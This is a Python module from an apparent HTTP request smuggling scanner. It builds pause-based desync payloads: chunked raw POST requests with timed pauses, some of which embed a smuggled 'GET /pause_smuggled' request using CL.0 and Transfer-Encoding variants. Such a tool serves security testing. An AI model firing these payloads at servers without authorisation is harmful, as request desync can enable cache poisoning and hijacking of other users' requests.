"""Pause-based desync payload generator.

In pause-based desync:
- Exploit read timeout differences between frontend and backend
- Frontend has longer timeout than backend, or vice versa
- Attacker pauses mid-request to trigger timeout on one server
- Timeout causes one server to process partial data as complete request

This attack exploits timing differences rather than header parsing differences.
"""

import asyncio
from typing import List, Tuple, Optional
from urllib.parse import urlparse
from dataclasses import dataclass

from http_smuggler.core.models import (
    Endpoint,
    SmugglingVariant,
    DetectionMethod,
)
from http_smuggler.payloads.generator import (
    Payload,
    PayloadGenerator,
    PayloadCategory,
)


@dataclass
class PauseSpec:
    """Specification for where and how long to pause."""
    pause_after_bytes: int  # Pause after sending this many bytes
    pause_duration: float   # Pause duration in seconds
    description: str        # Human description of the pause point


class PauseBasedPayloadGenerator(PayloadGenerator):
    """Generator for pause-based desync payloads.
    
    These payloads exploit timing differences between servers by
    introducing strategic pauses during request transmission.
    """
    
    # Common pause durations to try
    PAUSE_DURATIONS = [5.0, 10.0, 15.0, 30.0, 61.0]
    
    @property
    def variant(self) -> SmugglingVariant:
        return SmugglingVariant.PAUSE_BASED
    
    @property
    def name(self) -> str:
        return "Pause-Based Desync Generator"
    
    def _extract_host_path(self, endpoint: Endpoint) -> Tuple[str, str]:
        """Extract host and path from endpoint."""
        parsed = urlparse(endpoint.url)
        host = parsed.hostname or ""
        if parsed.port and parsed.port not in (80, 443):
            host = f"{host}:{parsed.port}"
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"
        return host, path
    
    def generate_timing_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate pause-based timing detection payloads.
        
        These payloads are sent in parts with pauses, detecting
        if servers handle timeouts differently.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        # Pause after headers, before body
        for pause_duration in [5.0, 10.0, 15.0]:
            headers = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 10\r\n"
                f"\r\n"
            )
            body = "x=12345678"  # 10 bytes
            
            payloads.append(Payload(
                name=f"Pause-headers-{int(pause_duration)}s",
                variant=self.variant,
                category=PayloadCategory.TIMING,
                raw_request=(headers + body).encode(),
                description=f"Pause {pause_duration}s after headers",
                detection_method=DetectionMethod.TIMING,
                expected_behavior="Server may timeout waiting for body",
                expected_timeout=pause_duration + 5.0,
                metadata={
                    "pause_spec": {
                        "pause_after": "headers",
                        "pause_after_bytes": len(headers),
                        "pause_duration": pause_duration,
                    },
                    "first_chunk": headers,
                    "second_chunk": body,
                },
            ))
        
        # Pause in middle of body
        for pause_duration in [5.0, 10.0]:
            headers = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 20\r\n"
                f"\r\n"
            )
            body_part1 = "x=12345"  # 7 bytes
            body_part2 = "67890abcdefgh"  # 13 bytes
            
            full_request = headers + body_part1 + body_part2
            pause_after = len(headers) + len(body_part1)
            
            payloads.append(Payload(
                name=f"Pause-body-mid-{int(pause_duration)}s",
                variant=self.variant,
                category=PayloadCategory.TIMING,
                raw_request=full_request.encode(),
                description=f"Pause {pause_duration}s in middle of body",
                detection_method=DetectionMethod.TIMING,
                expected_behavior="Server may timeout waiting for body completion",
                expected_timeout=pause_duration + 5.0,
                metadata={
                    "pause_spec": {
                        "pause_after": "body_part1",
                        "pause_after_bytes": pause_after,
                        "pause_duration": pause_duration,
                    },
                    "first_chunk": headers + body_part1,
                    "second_chunk": body_part2,
                },
            ))
        
        # Pause after request line
        for pause_duration in [5.0, 10.0]:
            request_line = f"POST {path} HTTP/1.1\r\n"
            rest = (
                f"Host: {host}\r\n"
                f"Content-Length: 0\r\n"
                f"\r\n"
            )
            
            payloads.append(Payload(
                name=f"Pause-reqline-{int(pause_duration)}s",
                variant=self.variant,
                category=PayloadCategory.TIMING,
                raw_request=(request_line + rest).encode(),
                description=f"Pause {pause_duration}s after request line",
                detection_method=DetectionMethod.TIMING,
                expected_behavior="Server may timeout waiting for headers",
                expected_timeout=pause_duration + 5.0,
                metadata={
                    "pause_spec": {
                        "pause_after": "request_line",
                        "pause_after_bytes": len(request_line),
                        "pause_duration": pause_duration,
                    },
                    "first_chunk": request_line,
                    "second_chunk": rest,
                },
            ))
        
        return payloads
    
    def generate_differential_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate pause-based differential detection payloads.
        
        These payloads exploit timeout differences to smuggle requests.
        If frontend times out but backend keeps connection, smuggled
        request is processed.
        """
        host, path = self._extract_host_path(endpoint)
        payloads = []
        
        # Pause-based CL.0 attack
        # Frontend uses Content-Length, backend ignores it after timeout
        for pause_duration in [30.0, 61.0]:  # Common timeout boundaries
            smuggled = f"GET /pause_smuggled HTTP/1.1\r\nHost: {host}\r\n\r\n"
            
            # First request with body that contains smuggled request
            headers = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(smuggled)}\r\n"
                f"\r\n"
            )
            
            payloads.append(Payload(
                name=f"Pause-CL0-{int(pause_duration)}s",
                variant=self.variant,
                category=PayloadCategory.DIFFERENTIAL,
                raw_request=(headers + smuggled).encode(),
                description=f"Pause-based CL.0 with {pause_duration}s delay",
                detection_method=DetectionMethod.DIFFERENTIAL,
                expected_behavior="Backend ignores body after timeout, processes as new request",
                poison_prefix="GET /pause_smuggled",
                metadata={
                    "pause_spec": {
                        "pause_after": "headers",
                        "pause_after_bytes": len(headers),
                        "pause_duration": pause_duration,
                    },
                    "first_chunk": headers,
                    "second_chunk": smuggled,
                    "attack_type": "cl_0_pause",
                },
            ))
        
        # Pause-based TE smuggling
        for pause_duration in [30.0]:
            chunk_terminator = "0\r\n\r\n"
            smuggled = f"GET /pause_te_smuggled HTTP/1.1\r\nHost: {host}\r\n\r\n"
            body = chunk_terminator + smuggled
            
            headers = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
            )
            
            payloads.append(Payload(
                name=f"Pause-TE-{int(pause_duration)}s",
                variant=self.variant,
                category=PayloadCategory.DIFFERENTIAL,
                raw_request=(headers + body).encode(),
                description=f"Pause-based TE smuggling with {pause_duration}s delay",
                detection_method=DetectionMethod.DIFFERENTIAL,
                expected_behavior="Timeout causes partial processing, smuggled request executes",
                poison_prefix="GET /pause_te_smuggled",
                metadata={
                    "pause_spec": {
                        "pause_after": "chunk_terminator",
                        "pause_after_bytes": len(headers) + len(chunk_terminator),
                        "pause_duration": pause_duration,
                    },
                },
            ))
        
        return payloads
    
    def generate_custom_pause_payload(
        self,
        endpoint: Endpoint,
        pause_after_bytes: int,
        pause_duration: float,
        full_request: bytes,
    ) -> Payload:
        """Generate a custom pause-based payload.
        
        Args:
            endpoint: Target endpoint
            pause_after_bytes: Number of bytes to send before pause
            pause_duration: Pause duration in seconds
            full_request: Complete request bytes
        
        Returns:
            Custom pause-based payload
        """
        return Payload(
            name=f"Pause-custom-{pause_after_bytes}b-{int(pause_duration)}s",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=full_request,
            description=f"Custom pause after {pause_after_bytes} bytes for {pause_duration}s",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Custom pause-based detection",
            expected_timeout=pause_duration + 10.0,
            metadata={
                "pause_spec": {
                    "pause_after_bytes": pause_after_bytes,
                    "pause_duration": pause_duration,
                },
                "first_chunk": full_request[:pause_after_bytes],
                "second_chunk": full_request[pause_after_bytes:],
            },
        )


async def send_with_pause(
    writer: asyncio.StreamWriter,
    payload: Payload,
) -> None:
    """Send a pause-based payload with actual pauses.
    
    This helper function sends the payload in chunks with
    the specified pauses. Used by the detection engine.
    
    Args:
        writer: Async stream writer
        payload: Pause-based payload with pause_spec metadata
    """
    pause_spec = payload.metadata.get("pause_spec", {})
    first_chunk = payload.metadata.get("first_chunk", b"")
    second_chunk = payload.metadata.get("second_chunk", b"")
    pause_duration = pause_spec.get("pause_duration", 0)
    
    if isinstance(first_chunk, str):
        first_chunk = first_chunk.encode()
    if isinstance(second_chunk, str):
        second_chunk = second_chunk.encode()
    
    # Send first chunk
    writer.write(first_chunk)
    await writer.drain()
    
    # Pause
    if pause_duration > 0:
        await asyncio.sleep(pause_duration)
    
    # Send second chunk
    writer.write(second_chunk)
    await writer.drain()

